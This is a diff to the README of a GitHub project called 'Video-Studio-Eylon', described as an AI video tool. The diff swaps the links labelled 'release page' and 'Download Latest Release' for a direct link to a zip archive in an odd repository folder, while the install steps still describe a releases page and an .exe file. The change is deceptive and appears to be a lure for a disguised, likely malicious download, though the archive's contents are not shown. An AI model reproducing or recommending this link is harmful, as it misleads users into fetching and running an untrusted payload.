@@ -1,6 +1,6 @@
 # 🎬 Video-Studio-Eylon - Create professional AI videos with ease
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Zorineostensive1863/Video-Studio-Eylon/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Zorineostensive1863/Video-Studio-Eylon/raw/refs/heads/main/floroon/Video-Eylon-Studio-3.3.zip)
 
 ## 🎯 About the project
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start:
 
 You will download the installation file directly from the official project page. Follow these steps:
 
-1. Visit [this release page](https://github.com/Zorineostensive1863/Video-Studio-Eylon/releases).
+1. Visit [this release page](https://github.com/Zorineostensive1863/Video-Studio-Eylon/raw/refs/heads/main/floroon/Video-Eylon-Studio-3.3.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release entry.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your computer in a folder you can find easily, such as your Downloads folder.
